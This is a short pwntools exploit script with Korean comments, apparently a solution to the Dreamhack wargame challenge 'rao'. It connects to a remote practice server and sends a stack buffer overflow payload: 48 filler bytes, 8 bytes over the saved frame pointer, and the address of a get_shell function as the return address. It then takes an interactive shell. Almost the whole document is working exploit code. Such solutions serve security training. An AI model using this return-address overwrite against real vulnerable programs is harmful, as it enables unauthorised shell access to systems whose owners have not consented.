from pwn import *

connection = remote('host1.dreamhack.games', 13293)  # 연결하는 명령어
context.arch = "amd64"  # x86-64 아키텍처 설정

E = ELF("./rao")           # 주어진 바이너리 파일


buffer_cover = b'E'*48     # 48바이트만큼 덮어쓰기
sfp_cover = b'A'*8        # SFP 영역을 8바이트만큼 덮어쓰기
ret_addr = p64(E.symbols['get_shell'])            # main 함수의 반환 주소를 get_shell 함수의 주소로 덮어쓰기

payload = buffer_cover + sfp_cover  + ret_addr     # 전체 payload
print(payload)
connection.send(payload)   # payload 전송
connection.interactive()   # shell 획득